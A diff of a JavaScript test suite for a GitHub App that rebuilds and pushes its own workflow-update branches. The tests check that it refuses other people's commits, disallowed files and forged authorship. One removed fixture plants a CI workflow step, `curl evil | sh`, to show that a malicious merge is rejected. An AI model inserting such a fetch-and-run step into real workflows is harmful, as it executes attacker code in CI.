@@ -1,5 +1,4 @@
 import {
-	existsSync,
 	readFileSync,
 	writeFileSync,
 } from 'fs';
@@ -10,15 +9,20 @@ import nock from 'nock';
 import test from 'tape';
 
 import { appAuth } from '../../../fleet/lib/app.mjs';
+import { fixBranch } from '../../../fleet/lib/branches.mjs';
 import {
-	assertOwnChanges,
+	assertBotOwned,
 	botIdentity,
 	checkout,
 	closePR,
+	commitChanges,
 	findPR,
-	prepareBranch,
+	foreignCommits,
+	isSingleOnBase,
+	ownCommits,
 	publish,
-	remoteHasBranch,
+	pushBranch,
+	remoteTip,
 } from '../../../fleet/lib/pr.mjs';
 import { privateKey } from './helpers/github.mjs';
 import {
@@ -40,7 +44,7 @@ const repository = 'o/r';
 const owner = 'o';
 const name = 'r';
 const base = 'main';
-const branch = 'fleet/fix';
+const branch = fixBranch;
 const lockfile = '.github/workflows/actions.lock';
 const files = {
 	[lockfile]: 'base lock\n',
@@ -345,443 +349,274 @@ test('findPR', async (t) => {
 	t.end();
 });
 
-test('remoteHasBranch', (t) => {
+test('remoteTip', (t) => {
 	const server = setup(t);
 	const { git } = clone(t, server);
 
-	t.equal(remoteHasBranch(git, branch), false, 'no branch');
-	server.commit(branch, { 'x.txt': 'x\n' }, { from: 'main' });
-	t.equal(remoteHasBranch(git, branch), true, 'the branch');
-	t.equal(remoteHasBranch(git, 'fleet'), false, 'not a prefix of it');
+	t.equal(remoteTip(git, branch), null, 'no branch');
+	const head = server.commit(branch, { 'x.txt': 'x\n' }, { from: 'main' });
+	t.equal(remoteTip(git, branch), head, 'the branch’s tip');
+	t.equal(git(['cat-file', '-t', head]).stdout.trim(), 'commit', 'fetched');
+	t.equal(remoteTip(git, 'fleet'), null, 'not a prefix of it');
 	t.end();
 });
 
-test('prepareBranch: building on the right commit', (t) => {
-	t.test('create, without a remote branch: the base', (st) => {
-		const server = setup(st);
-		const { git } = clone(st, server);
+/** @type {(dir: string, message: string, contents: Record<string, string | null>, committer: import('./helpers/git.mjs').Person) => void} */
+function commitAs(dir, message, contents, committer) {
+	writeFiles(dir, contents);
+	fixtureGit(dir, ['add', '--all'], committer);
+	fixtureGit(dir, ['commit', '--quiet', '--author', `${bot.name} <${bot.email}>`, '--message', message], committer);
+}
 
-		prepareBranch(git, {
-			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isLockfile,
-		});
-
-		st.equal(git(['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim(), branch, 'on the branch');
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), server.tip('main'), 'at the base');
-		st.end();
+test('ownCommits, foreignCommits, and isSingleOnBase', (t) => {
+	const server = setup(t);
+	const one = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
+	const { git } = clone(t, server);
+	const at = (/** @type {string} */ tip) => ({
+		base, tip, identity: bot,
 	});
 
-	t.test('update: the remote branch, merged with the base', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		const moved = server.commit('main', { 'README.md': 'moved\n' });
-		const { git, dir } = clone(st, server);
+	t.deepEqual(ownCommits(git, at(one)), [one], 'one commit of its own');
+	t.equal(foreignCommits(git, at(one)), 0, 'the bot’s');
+	t.ok(isSingleOnBase(git, at(one)), 'one commit, on the base’s tip');
+	t.deepEqual(ownCommits(git, at(server.tip('main'))), [], 'the base has none');
+	t.notOk(isSingleOnBase(git, at(server.tip('main'))), 'so isn’t one commit on it');
 
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-		});
+	const two = server.commit(branch, { [lockfile]: 'newer lock\n' }, { who: bot });
+	remoteTip(git, branch);
+	t.deepEqual(ownCommits(git, at(two)), [two, one], 'two commits, newest first');
+	t.notOk(isSingleOnBase(git, at(two)), 'isn’t one commit');
 
-		st.deepEqual(git(['log', '-1', '--format=%P']).stdout.trim().split(' '), [head, moved], 'a merge of the branch’s tip and the base');
-		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'bot lock\n', 'keeps the branch’s changes');
-		st.equal(readFileSync(path.join(dir, 'README.md'), 'utf8'), 'moved\n', 'and the base’s');
-		st.end();
-	});
+	const theirs = server.commit(branch, { 'README.md': 'theirs\n' }, { who: mallory });
+	remoteTip(git, branch);
+	t.equal(foreignCommits(git, at(theirs)), 1, 'someone else’s commit');
+	const shouting = server.commit(branch, { 'README.md': 'loud\n' }, { who: { name: bot.name, email: bot.email.toUpperCase() } });
+	remoteTip(git, branch);
+	t.equal(foreignCommits(git, at(shouting)), 1, 'emails are matched in any case: only the earlier one is someone else’s');
 
-	t.test('update, already up to date: just the remote branch', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		const { git } = clone(st, server);
+	server.commit('main', { 'README.md': 'moved\n' });
+	git(['fetch', '--quiet', 'origin']);
+	t.notOk(isSingleOnBase(git, at(one)), 'one commit, on an older base commit, isn’t');
 
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-		});
-
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'at the branch’s tip');
-		st.end();
-	});
-
-	t.test('reopen, with the remote branch: the remote branch', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		const newer = server.commit(branch, { [lockfile]: 'newer lock\n' }, { who: bot });
-		server.setRef('refs/pull/7/head', head);
-		const { git } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'reopen', number: 7, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-		});
-
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), newer, 'the branch’s tip, not the PR’s');
-		st.end();
-	});
-
-	t.test('reopen, without the remote branch: the PR’s head', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.setRef('refs/pull/7/head', head);
-		server.deleteRef(`refs/heads/${branch}`);
-		const { git } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'reopen', number: 7, head }, base, branch, remoteHasBranch: false, regenerated: isLockfile,
-		});
-
-		st.equal(git(['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim(), branch, 'on the branch');
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'at the PR’s head');
-		st.end();
-	});
-
+	const { git: other, dir } = clone(t, server);
+	commitAs(dir, 'committed by someone else', { [lockfile]: 'x\n' }, mallory);
+	const head = other(['rev-parse', 'HEAD']).stdout.trim();
+	t.equal(foreignCommits(other, {
+		base, tip: head, identity: bot,
+	}), 1, 'the bot’s authorship, committed by someone else, is someone else’s');
 	t.end();
 });
 
-test('prepareBranch: conflicts', (t) => {
-	t.test('in regenerated files: the base’s version', (st) => {
+test('assertBotOwned', (t) => {
+	const server = setup(t);
+	const mine = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
+	const theirs = server.commit(branch, { 'README.md': 'theirs\n' }, { who: mallory });
+	const { git } = clone(t, server);
+	remoteTip(git, branch);
+
+	t.doesNotThrow(() => assertBotOwned(git, {
+		base, branch, tip: mine, identity: bot,
+	}), 'only the bot’s commits');
+	t.throws(() => assertBotOwned(git, {
+		base, branch, tip: theirs, identity: bot,
+	}), new Error('`fleet/workflows` has 1 commit(s) by someone else, so it is never overwritten; remove them from the branch, or delete the branch, so the next run can rebuild it'), 'refuses anyone else’s');
+	t.end();
+});
+
+test('commitChanges', (t) => {
+	t.test('nothing to commit', (st) => {
 		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n', '.github/workflows/ci.yml': 'bot ci\n' }, { who: bot, from: 'main' });
-		const moved = server.commit('main', { [lockfile]: 'base moved\n', '.github/workflows/ci.yml': 'ci moved\n', 'README.md': 'moved\n' });
-		const { git, dir } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'takes the base’s lockfile');
-		st.equal(readFileSync(path.join(dir, '.github/workflows/ci.yml'), 'utf8'), 'ci moved\n', 'and every other conflicting regenerated file');
-		st.equal(readFileSync(path.join(dir, 'README.md'), 'utf8'), 'moved\n', 'merging the rest');
-		st.deepEqual(git(['log', '-1', '--format=%P|%an|%cn']).stdout.trim(), `${head} ${moved}|${bot.name}|${bot.name}`, 'commits the merge as the bot');
-		st.equal(git(['status', '--porcelain']).stdout, '', 'nothing left over');
+		const { git } = clone(st, server);
+		st.equal(commitChanges(git, {
+			base, message: 'm', paths: ['.github/workflows'], allowed: isWorkflow,
+		}), false, 'commits nothing');
+		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), server.tip('main'), 'still at the base');
 		st.end();
 	});
 
-	t.test('only the conflicting regenerated files are reset', (st) => {
+	t.test('changes to allowed files', (st) => {
 		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n', '.github/workflows/new.yml': 'bot new\n' }, { who: bot, from: 'main' });
-		server.commit('main', { [lockfile]: 'base moved\n' });
 		const { git, dir } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'takes the base’s version of the conflict');
-		st.equal(readFileSync(path.join(dir, '.github/workflows/new.yml'), 'utf8'), 'bot new\n', 'keeps the branch’s clean changes');
+		writeFiles(dir, { [lockfile]: 'new lock\n', '.github/workflows/new.yml': 'on: pull_request\n', 'README.md': 'not staged\n' });
+		st.equal(commitChanges(git, {
+			base, message: 'the message', paths: ['.github/workflows'], allowed: isWorkflow,
+		}), true, 'commits');
+		st.equal(git(['rev-parse', 'HEAD^']).stdout.trim(), server.tip('main'), 'on the base’s tip');
+		st.equal(git(['log', '-1', '--format=%s|%ae|%ce']).stdout.trim(), `the message|${bot.email}|${bot.email}`, 'as the bot');
+		st.deepEqual(git(['diff', '--name-only', 'HEAD^', 'HEAD']).stdout.trim().split('\n'), ['.github/workflows/actions.lock', '.github/workflows/new.yml'], 'only what’s under the paths');
 		st.end();
 	});
 
-	t.test('in a regenerated file the base deleted: deleted', (st) => {
+	t.test('changes to anything else: refused', (st) => {
 		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.commit('main', { [lockfile]: null });
 		const { git, dir } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-		});
-
-		st.notOk(existsSync(path.join(dir, lockfile)), 'follows the base');
-		st.equal(git(['status', '--porcelain']).stdout, '', 'committed');
-		st.equal(git(['diff', '--name-only', 'origin/main', 'HEAD']).stdout, '', 'matches the base');
+		writeFiles(dir, { [lockfile]: 'new lock\n', '.github/workflows/ci.yml': null });
+		st.throws(() => commitChanges(git, {
+			base, message: 'm', paths: ['.github/workflows'], allowed: isLockfile,
+		}), new Error('refusing to commit changes to files this job doesn’t write: `.github/workflows/ci.yml`'), 'names what isn’t allowed');
+		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), server.tip('main'), 'commits nothing');
 		st.end();
 	});
 
-	t.test('in a regenerated file the branch deleted: the base’s version', (st) => {
+	t.test('not at the base’s tip: refused', (st) => {
 		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: null }, { who: bot, from: 'main' });
-		server.commit('main', { [lockfile]: 'base moved\n' });
 		const { git, dir } = clone(st, server);
-
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-		});
-
-		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'restores the base’s');
-		st.equal(git(['status', '--porcelain']).stdout, '', 'committed');
-		st.end();
-	});
-
-	t.test('in any other file: refuses', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n', 'README.md': 'theirs\n' }, { who: mallory, from: 'main' });
-		server.commit('main', { [lockfile]: 'base moved\n', 'README.md': 'moved\n' });
-		const { git, dir } = clone(st, server);
-
-		st.throws(
-			() => prepareBranch(git, {
-				state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
-			}),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` conflicts with \`main\` in \`README.md\`; refusing to resolve that automatically. Resolve it on the branch, or delete the branch, so the next run can rebuild it.`,
-			'names only the unresolvable conflicts',
-		);
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'commits nothing');
-		st.equal(git(['status', '--porcelain']).stdout, '', 'aborts the merge');
-		st.notOk(readFileSync(path.join(dir, 'README.md'), 'utf8').includes('<<<<<<<'), 'leaves no conflict markers');
-		st.end();
-	});
-
-	t.test('the merge fails without conflicts: refuses', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.commit('main', { 'added.txt': 'base\n' });
-		const { git, dir } = clone(st, server);
-		/** @type {import('../../../fleet/lib/pr.mjs').Git} */
-		const untracked = (args, options) => {
-			const result = git(args, options);
-			if (args[0] === 'switch') {
-				writeFiles(dir, { 'added.txt': 'untracked\n' });
-			}
-			return result;
-		};
-
-		st.throws(
-			() => prepareBranch(untracked, {
-				state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: () => true,
-			}),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.startsWith(`could not merge \`main\` into \`${branch}\`:\n`) && e.message.includes('added.txt'),
-			'with git’s reason',
-		);
-		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'commits nothing');
+		botCommit(dir, 'already', { [lockfile]: 'x\n' });
+		writeFiles(dir, { [lockfile]: 'y\n' });
+		st.throws(() => commitChanges(git, {
+			base, message: 'm', paths: ['.github/workflows'], allowed: isWorkflow,
+		}), new Error('the clone is not at `main`’s tip, so nothing is committed'), 'so the commit is always one on the base');
 		st.end();
 	});
 
 	t.end();
 });
 
-test('assertOwnChanges', (t) => {
-	const options = {
-		base, branch, identity: bot, allowed: isWorkflow,
-	};
-
-	t.test('only the bot’s own commits, to allowed files', (st) => {
+test('pushBranch', (t) => {
+	t.test('only the App’s own branches', (st) => {
 		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
+		const before = server.tip('main');
+		const { git, dir } = clone(st, server);
+		botCommit(dir, 'm', { [lockfile]: 'x\n' });
+		st.throws(() => pushBranch(git, {
+			base, branch: 'main', tip: null, identity: bot,
+		}), new Error('`main` is not one of the App’s own branches, so it is never overwritten'), 'refuses any other branch');
+		st.equal(server.tip('main'), before, 'pushes nothing');
+		st.end();
+	});
+
+	t.test('only one commit, on the base’s tip', (st) => {
+		const server = setup(st);
+		const { git, dir } = clone(st, server);
+		st.throws(() => pushBranch(git, {
+			base, branch, tip: null, identity: bot,
+		}), new Error('refusing to push `fleet/workflows`: it must be one commit on top of `main`’s tip'), 'refuses the base itself');
+		botCommit(dir, 'one', { [lockfile]: 'x\n' });
+		botCommit(dir, 'two', { [lockfile]: 'y\n' });
+		st.throws(() => pushBranch(git, {
+			base, branch, tip: null, identity: bot,
+		}), /must be one commit/, 'refuses two commits');
+		st.equal(server.tip(`refs/heads/${branch}`), '', 'pushes nothing');
+		st.end();
+	});
+
+	t.test('no branch yet: a plain push', (st) => {
+		const server = setup(st);
+		const { git, dir } = clone(st, server);
+		botCommit(dir, 'm', { [lockfile]: 'x\n' });
+		st.equal(pushBranch(git, {
+			base, branch, tip: null, identity: bot,
+		}), 'pushed', 'pushes');
+		st.equal(server.tip(`refs/heads/${branch}`), git(['rev-parse', 'HEAD']).stdout.trim(), 'the commit');
+		st.end();
+	});
+
+	t.test('already that tree, on the base’s tip: left alone', (st) => {
+		const server = setup(st);
+		const head = server.commit(branch, { [lockfile]: 'x\n' }, { who: bot, from: 'main' });
+		const { git, dir } = clone(st, server);
+		const tip = remoteTip(git, branch);
+		botCommit(dir, 'rebuilt', { [lockfile]: 'x\n' });
+		st.notEqual(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'a new commit');
+		st.equal(pushBranch(git, {
+			base, branch, tip, identity: bot,
+		}), 'unchanged', 'pushes nothing');
+		st.equal(server.tip(`refs/heads/${branch}`), head, 'the branch is as it was');
+		st.end();
+	});
+
+	t.test('anything else: replaced, with a lease', (st) => {
+		const server = setup(st);
+		server.commit(branch, { [lockfile]: 'x\n' }, { who: bot, from: 'main' });
+		server.commit(branch, { [lockfile]: 'y\n' }, { who: bot });
+		const { git, dir } = clone(st, server);
+		const tip = remoteTip(git, branch);
+		botCommit(dir, 'rebuilt', { [lockfile]: 'y\n' });
+		st.equal(pushBranch(git, {
+			base, branch, tip, identity: bot,
+		}), 'pushed', 'two commits with the same tree are replaced by one');
+		st.deepEqual(server.log(`main..${branch}`).map((line) => line.split('|')[2]), ['rebuilt'], 'which is all the branch has');
+
 		server.commit('main', { 'README.md': 'moved\n' });
+		const { git: again, dir: againDir } = clone(st, server);
+		const before = remoteTip(again, branch);
+		botCommit(againDir, 'rebuilt again', { [lockfile]: 'y\n' });
+		st.equal(pushBranch(again, {
+			base, branch, tip: before, identity: bot,
+		}), 'pushed', 'the same tree on an older base commit is rebuilt on the new one');
+		st.equal(server.log(`${branch}`)[0].split('|')[3], server.tip('main'), 'whose only parent is the base’s tip');
+		st.end();
+	});
+
+	t.test('someone else’s commits: refused', (st) => {
+		const server = setup(st);
+		server.commit(branch, { [lockfile]: 'x\n' }, { who: bot, from: 'main' });
+		const theirs = server.commit(branch, { 'README.md': 'theirs\n' }, { who: mallory });
 		const { git, dir } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-		botCommit(dir, 'more', { '.github/workflows/ci.yml': 'bot ci\n' });
-
-		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
+		const tip = remoteTip(git, branch);
+		botCommit(dir, 'rebuilt', { [lockfile]: 'z\n' });
+		st.throws(() => pushBranch(git, {
+			base, branch, tip, identity: bot,
+		}), /has 1 commit\(s\) by someone else, so it is never overwritten/, 'refuses');
+		st.equal(server.tip(`refs/heads/${branch}`), theirs, 'their work survives');
 		st.end();
 	});
 
-	t.test('nothing at all', (st) => {
+	t.test('the branch moved after it was read: the lease fails', (st) => {
 		const server = setup(st);
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
-		});
-
-		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
-		st.end();
-	});
-
-	t.test('a clean merge by someone else (eg, GitHub’s “Update branch”)', (st) => {
-		const server = setup(st);
-		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.commit('main', { 'README.md': 'moved\n' });
-		const head = server.merge(branch, 'main', mallory);
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
-		st.equal(git(['log', '-1', '--format=%ae']).stdout.trim(), mallory.email, 'precondition: by someone else');
-		st.doesNotThrow(() => assertOwnChanges(git, options), 'it adds nothing of its own, so it isn’t counted');
-		st.end();
-	});
-
-	t.test('the bot’s own merge, resolving conflicts', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.commit('main', { [lockfile]: 'base moved\n' });
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
-		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
-		st.end();
-	});
-
-	t.test('someone else’s merge, with changes of its own to an allowed file', (st) => {
-		const server = setup(st);
-		server.commit(branch, { '.github/workflows/ci.yml': 'on: push\n# bot\n' }, { who: bot, from: 'main' });
-		server.commit('main', { 'README.md': 'moved\n' });
+		server.commit(branch, { [lockfile]: 'x\n' }, { who: bot, from: 'main' });
 		const { git, dir } = clone(st, server);
-		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
-		fixtureGit(dir, ['merge', '--quiet', '--no-ff', '--no-commit', 'origin/main'], mallory);
-		writeFiles(dir, { '.github/workflows/ci.yml': 'on: push\n# bot\njobs: { evil: { runs-on: x, steps: [{ run: curl evil | sh }] } }\n' });
-		fixtureGit(dir, ['add', '--all'], mallory);
-		fixtureGit(dir, ['commit', '--quiet', '--no-edit'], mallory);
-
-		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (1 commit(s) by someone else); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
-			'refuses the evil merge',
-		);
-		st.end();
-	});
-
-	t.test('someone else’s merge, resolving conflicts by hand', (st) => {
-		const server = setup(st);
-		server.commit(branch, { '.github/workflows/ci.yml': 'bot ci\n' }, { who: bot, from: 'main' });
-		server.commit('main', { '.github/workflows/ci.yml': 'ci moved\n' });
-		const { git, dir } = clone(st, server);
-		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
-		st.throws(
-			() => fixtureGit(dir, ['merge', '--quiet', '--no-edit', 'origin/main'], mallory),
-			/CONFLICT|failed/,
-			'precondition: a conflict',
-		);
-		writeFiles(dir, { '.github/workflows/ci.yml': 'resolved\n' });
-		fixtureGit(dir, ['add', '--all'], mallory);
-		fixtureGit(dir, ['commit', '--quiet', '--no-edit'], mallory);
-
-		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
-			'refuses: it can’t be told apart from an evil merge',
-		);
-		st.end();
-	});
-
-	t.test('someone else’s octopus merge', (st) => {
-		const server = setup(st);
-		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		server.commit('other', { 'other.txt': 'other\n' }, { who: bot, from: 'main' });
-		server.commit('main', { 'README.md': 'moved\n' });
-		const { git, dir } = clone(st, server);
-		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
-		fixtureGit(dir, ['merge', '--quiet', '--no-edit', 'origin/main', 'origin/other'], mallory);
-
-		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 3, 'precondition: an octopus merge');
-		st.throws(
-			() => assertOwnChanges(git, { ...options, allowed: () => true }),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
-			'refuses',
-		);
-		st.end();
-	});
-
-	t.test('a file outside what’s allowed', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { 'README.md': 'bot readme\n', 'src/x.js': 'x\n' }, { who: bot, from: 'main' });
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (files: README.md, src/x.js); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
-			'refuses, naming the files',
-		);
-		st.end();
-	});
-
-	t.test('a file with an unusual name', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { 'tab\there.txt': 'x\n' }, { who: bot, from: 'main' });
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(files: tab\there.txt)'),
-			'names it unquoted',
-		);
-		st.doesNotThrow(() => assertOwnChanges(git, { ...options, allowed: (file) => file === 'tab\there.txt' }), 'and checks it unquoted');
-		st.end();
-	});
-
-	t.test('someone else’s commit', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'their lock\n' }, { who: mallory, from: 'main' });
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (1 commit(s) by someone else); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
-			'refuses, counting the commits',
-		);
-		st.end();
-	});
-
-	t.test('the bot’s authorship, committed by someone else', (st) => {
-		const server = setup(st);
-		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		const { git, dir } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
-		});
-		writeFiles(dir, { [lockfile]: 'forged\n' });
-		fixtureGit(dir, ['add', '--all'], mallory);
-		fixtureGit(dir, ['commit', '--quiet', '--message', 'forged', `--author=${bot.name} <${bot.email}>`], mallory);
-
-		st.equal(git(['log', '-1', '--format=%ae|%ce']).stdout.trim(), `${bot.email}|${mallory.email}`, 'precondition: authored by the bot, committed by someone else');
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
-			'refuses',
-		);
-		st.end();
-	});
-
-	t.test('both', (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { 'README.md': 'theirs\n' }, { who: mallory, from: 'main' });
-		const { git } = clone(st, server);
-		prepareBranch(git, {
-			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-
-		st.throws(
-			() => assertOwnChanges(git, options),
-			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(files: README.md; 1 commit(s) by someone else)'),
-			'names both problems',
-		);
+		const tip = remoteTip(git, branch);
+		const moved = server.commit(branch, { [lockfile]: 'pushed meanwhile\n' }, { who: bot });
+		botCommit(dir, 'rebuilt', { [lockfile]: 'z\n' });
+		st.throws(() => pushBranch(git, {
+			base, branch, tip, identity: bot,
+		}), new Error('`fleet/workflows` changed after it was read, so it was not overwritten (its push was rejected); the next run rebuilds it from what it is now'), 'refuses, without retrying');
+		st.equal(server.tip(`refs/heads/${branch}`), moved, 'the other push survives');
 		st.end();
 	});
 
 	t.end();
 });
 
-/** @type {(requests: Recorded[]) => [string, unknown][]} */
+/** @type {(requests: Recorded[]) => [string, any][]} */
 const writes = (requests) => requests.map((r) => [`${r.method} ${r.path}`, r.body]);
 
 test('publish', (t) => {
 	const common = {
-		owner, name, base, branch, identity: bot, allowed: isWorkflow, title: 'the title', body: 'the body',
+		owner, name, base, branch, identity: bot, title: 'the title', body: 'the body',
 	};
 
-	t.test('changes the bot didn’t make: refuses, before pushing or touching the PR', async (st) => {
+	t.test('a branch that isn’t the App’s: refused before anything', async (st) => {
+		const server = setup(st);
+		const requests = mockAPI(st, []);
+		const { git, dir } = clone(st, server);
+		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });
+		await publish({
+			...common, branch: 'feature', octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head: 'abc' }, tip: null,
+		}).then(
+			() => st.fail('should reject'),
+			(e) => st.equal(e.message, '`feature` is not one of the App’s own branches, so it is never overwritten', 'rejects'),
+		);
+		st.equal(server.tip('refs/heads/feature'), '', 'pushes nothing');
+		st.deepEqual(requests, [], 'touches no PR');
+		st.end();
+	});
+
+	t.test('someone else’s commits: refused, before pushing or touching the PR', async (st) => {
 		const server = setup(st);
 		const head = server.commit(branch, { [lockfile]: 'their lock\n' }, { who: mallory, from: 'main' });
 		server.setRef('refs/pull/5/head', head);
 		server.deleteRef(`refs/heads/${branch}`);
 		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
 		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'reopen', number: 5, head };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
-		});
 		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });
 
 		await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head }, tip: null,
 		}).then(
 			() => st.fail('should reject'),
-			(e) => st.ok(e.message.includes('(1 commit(s) by someone else); refusing to push'), 'rejects via `assertOwnChanges`'),
+			(e) => st.match(e.message, /has 1 commit\(s\) by someone else, so it is never overwritten/, 'rejects via `assertBotOwned`'),
 		);
 		st.equal(server.tip(`refs/heads/${branch}`), '', 'pushes nothing, not even the restored branch');
 		st.deepEqual(requests, [], 'touches no PR');
